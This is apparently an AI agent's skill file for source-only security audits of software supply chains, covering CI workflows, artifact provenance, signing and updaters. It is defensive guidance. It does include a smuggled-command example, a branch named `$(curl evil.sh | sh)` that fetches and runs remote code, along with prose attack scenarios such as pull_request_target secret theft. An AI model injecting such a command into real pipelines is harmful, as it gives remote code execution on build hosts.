<!--
  AI-Security-Audit-Skills
  Author   : Vijaya Kumar L  (Rise With VJ)
  GitHub   : https://github.com/risewithvj
  LinkedIn : https://www.linkedin.com/in/vijayakumarl/
  License  : MIT
-->

# Supply Chain and Release Hunting

> **Source-only note (v1):** this skill never runs the target. Anywhere below that mentions a "bounded local test", a "local fixture", or a "sandbox", decide the question from the code itself. When source alone cannot decide it, record the verdict as `needs_validation` and name the exact fact you could not observe. All checklist references use the `checklists/...` layout, and every finding passes through the evidence gate in `rules/evidence-gate.md`.

## What this domain covers

The territory here is the chain of custody from a line of committed code to the binary, image, or package a user eventually runs. Open this file whenever the target pulls in third-party dependencies, builds from contributions you do not fully trust, executes CI pipelines, assembles release artifacts, signs or promotes those artifacts, loads plugins or extensions, or ships updates to already-deployed software. Each of those steps is a handoff where trust can silently change hands.

Two neighbouring files pick up where this one stops. For defects inside a locally linked binary or a native loader, go to `memory-safety-and-binary.md`. For the authority a workload holds once it is already running in production, go to `cloud-and-deployment.md`.

On a large codebase, carve the review into five tracks and work them separately: (1) how dependencies resolve, (2) how CI stays isolated, (3) how artifacts earn provenance, (4) how releases get authorised, and (5) how updaters and plugins decide what to trust.

## Discipline to carry into every agent prompt for this domain

```
- A pinned-but-mutable or known-CVE dependency, on its own, is not a finding. Demonstrate who can steer resolution, which build step consumes the result, and what execution or release boundary sits downstream.
- Trace integrity through the whole chain: committer identity -> resolved inputs -> build worker -> produced artifact -> test outcome -> signature or attestation -> promotion -> the client that installs the update.
- Treat CI configuration as authorization logic. Pin down which event fired the workflow, whose code then executes, which secrets and tokens are in scope, and what the job is allowed to publish or modify.
- A checksum served from the very same untrusted place as the artifact proves nothing about integrity. Find the trusted root of that checksum and the behaviour when verification fails.
- Mark `confirmed` only for in-repo control-flow breaks you can validate with a bounded local test. Branch-protection state, hosted-runner behaviour, registry internals, signing-service policy, or production-promotion steps that source cannot reveal get `needs_validation`.
```

---

## Track A — Dependencies and build inputs (subagent_type: `general`)

What enters the build but was not fully authored or reviewed in this repo.

| Class | What goes wrong | Where to look |
|---|---|---|
| Namespace and source confusion | The resolver quietly picks a public package, fallback registry, mirror, or source URL instead of the intended private one. | Package naming, registry/source priority order, lockfile and checksum enforcement, secondary build manifests, OS/arch-specific resolution, and how first install differs from later updates. |
| Mutable, unbound inputs | The build pulls branches, tags, unpinned submodules, downloaded toolchains, `:latest` container tags, CI actions referenced by a floating ref, remote includes, or generated assets whose bytes can shift without any source review. | Find a lower-trust writer plus a path from the mutable input into trusted build output. Reproducibility proves repeatability, not authenticity. |
| Codegen and generated-source gaps | Schemas, vendored archives, generated SDK clients, locale bundles, doc samples, or binary blobs end up as shipped or executable content without the review gate that source enjoys. | Regenerate locally and diff against the committed output; confirm who owns both the generator and its inputs. |
| Build-context over-inclusion | Secrets, local config, repo metadata, test fixtures, or developer scratch files slip into an image or package when the ignore rules and the build context reach wider than the intended release surface. | Prove the shipped artifact actually exposes a live credential, private data, or a privileged setting — not a placeholder. |

**Illustration (namespace confusion).** An HRMS platform publishes an internal payroll-calculation library to a private registry under the scope `@cielhr/payroll-engine`. The `.npmrc` sets the private registry but leaves the default public registry as a fallback. An attacker registers `@cielhr/payroll-engine` on the public registry at a higher version. On a clean CI runner the resolver, chasing the newest version, fetches the attacker's package — which runs during install on the host that computes employee salaries. The finding is only real once you show the fallback path in config *and* a build step that consumes the package.

**Illustration (build-context leak).** A Dockerfile for a KYC-verification service does `COPY . /app` with no `.dockerignore`, sweeping a committed `.env.staging` holding the Aadhaar-verification API key into the published image layer. Confirm the key is live and reachable in the final image before reporting.

---

## Track B — CI and automation (subagent_type: `general`)

CI is where untrusted contributions meet privileged credentials. Treat every workflow as code that grants authority.

**Untrusted code inside a privileged workflow.**
A pull request, an issue comment, a fork build, an automated dependency bump, or some other external event ends up running contributor-controlled code while protected secrets, write-scoped tokens, deploy rights, or a trusted runner are in reach. Line up the trigger type, the checkout ref, any approval gate, environment protection, and permission scoping side by side. Never lean on repository-host defaults that are not written down in source.

*Example:* a workflow triggered on `pull_request_target` checks out the PR head ref and then runs `npm run build`, which executes the fork's own `postinstall`. Because `pull_request_target` runs with the base repo's secrets, the fork now reads the deployment token.

**Command and expression injection in workflows.**
Branch names, commit messages, issue titles, PR body text, artifact names, matrix entries, or any generated output flow into shell commands, template expressions, file paths, or privileged workflow inputs without being canonicalised or validated first. A branch named `$(curl evil.sh | sh)` interpolated into a `run:` block is the classic shape.

**Cache, artifact, and workspace cross-trust.**
A lower-trust job seeds a cache, uploads an artifact, writes a shared workspace, or sets an output which a more-trusted job then restores and goes on to execute or release. Inspect cache keys and namespaces, who produced each artifact, whether the consumer binds to a digest, retention windows, and whether promotion re-resolves anything by a mutable name.

**Over-broad automation identity.**
A CI job holds permissions wider than the task, the repo, the environment, or the time window it needs — and an untrusted input can steer which resource those permissions hit. Missing least privilege by itself is only hardening; you must land on a privileged action that is actually reachable.

---

## Track C — Artifact provenance (subagent_type: `general`)

Between "the build finished" and "the release went out", identity must never be allowed to drift.

- **Substitution between build and promotion.** Testing, review, signing, and publishing each refer to a mutable tag, filename, channel, or artifact ID rather than the one immutable digest the build produced. Audit every copy, repack, multi-arch merge, and provenance step in that gap. If the artifact that gets signed is addressed by a floating tag, a different artifact can occupy that tag before signing.
- **Checksum trust root.** Re-confirm that integrity checks anchor to something independent of the delivery channel, and that a mismatch fails the pipeline closed rather than warning and continuing.

---

## Track D — Release authorization and signing (subagent_type: `general`)

**Signing-policy and authorization gaps.**
A release or a signature is honoured even though its origin is the wrong key role, environment, branch, repository, or workflow, or it sits below the required signing threshold. Read the identity claims *inside* the attestation and verify the consumer actually checks them — a cryptographically valid signature over the wrong identity is still wrong. Rotation, expiry, and revocation must fail closed wherever policy demands it.

**Failure-path review.**
Walk each path explicitly: a registry outage, a rollback, a partial release across platforms, an attestation that is missing, a download that fails, and a key that has been revoked. The behaviour on failure is part of release integrity, not an edge case to skip.

---

## Track E — Updaters, plugins, and extensions (subagent_type: `general`)

**Update metadata and rollback confusion.**
An updater verifies the *payload bytes* yet never checks the version, product, platform, channel, destination path, expiry, or rollback state — or it pairs metadata from one authorised transaction with a payload from another. Check that installation is atomic and that recovery behaves. A call to a signature-verification API without binding the result to policy is incomplete verification.

*Example:* a desktop payslip client verifies the installer's signature but never checks the embedded version, so an attacker who can man-in-the-middle the update feed serves a correctly signed *older* build with a known RCE — a rollback attack.

**Plugin and extension trust expansion.**
An extension acquires host authority past the scope it declared, a publisher of lower trust can impersonate or overwrite a different publisher's identity, or install/update hooks fire before authenticity and capability are checked. Note that a user deliberately installing an arbitrary same-privilege plugin is not, by itself, a crossed privilege boundary.

---

## Moves that apply across every track

- **Walk the chain backwards.** Start from a released digest or an installed update and trace back to every source file, generated input, credential, build worker, cache, test result, and authorization decision that fed it.
- **Diff untrusted vs protected events.** Lay an untrusted-trigger workflow next to a protected one and mark each persisted channel (cache, artifact, workspace, output) that crosses between them. Every crossing needs both an immutable identity and a trusted producer.
- **Exercise the failure policy.** Confirm what happens during a registry outage, after a rollback, on a partial release, when an attestation is absent, when a download fails, or once a key is revoked.

---

## Validation rules — clear these before reporting ANY finding in this domain

1. **Name the full chain.** State the lower-trust actor, the source/cache/artifact/metadata they control, the trusted job or updater that consumes it, and the concrete end effect: unauthorized publication, injected code, secret disclosure, or privileged execution.
2. **Prove identity drift.** Show that artifact identity actually breaks across the handoff — a real consumer must be reached by an unbound digest or a different mutable name.
3. **Check the real defaults.** Verify what the package-manager, repo-host, registry, and signing layers default to at the *pinned* version in use. Any hosted control you cannot observe from source is `needs_validation`.
4. **Keep local tests bounded.** Use a throwaway fixture repository, a clearly dummy credential marker, a local registry or config, and a non-production artifact namespace. Never publish or mutate a real release.
5. **Grade honestly.** `confirmed` requires a complete, source-visible handoff with a meaningful outcome. Otherwise return `needs_validation`, naming the exact deployment, signing, registry, runner, or branch detail that an owner has to confirm.
